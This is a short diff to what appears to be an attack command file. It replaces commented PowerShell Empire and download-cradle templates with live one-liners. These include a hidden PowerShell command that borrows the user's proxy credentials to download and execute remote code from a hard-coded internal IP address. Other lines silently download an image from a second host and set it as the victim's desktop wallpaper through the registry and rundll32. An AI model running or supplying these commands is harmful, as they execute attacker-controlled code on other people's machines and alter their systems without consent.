@@ -1,6 +1,4 @@
-# Powershell Empire command example
-# powershell -noP -sta -w 1 -enc <base64 string>
-#
-# Powershell IEX example
-# powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('<URL>');"
-# Other commands
+powershell.exe -nop -w hidden -c $E=new-object net.webclient;$E.proxy=[Net.WebRequest]::GetSystemWebProxy();$E.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $E.downloadstring('http://10.1.120.42:990/sMfe6gBSB7uYObX');
+powershell.exe -nop -w hidden -c (new-object system.net.webclient).downloadFile("http://10.1.120.69:8080/james.jpg", "C:\Users\Public\wallpaper.jpg")
+powershell.exe -nop -w hidden -c set-itemproperty "HKCU:Control Panel\Desktop" -name WallPaper -value C:\Users\Public\wallpaper.jpg
+rundll32.exe user32.dll,UpdatePerUserSystemParameters ,1 ,True
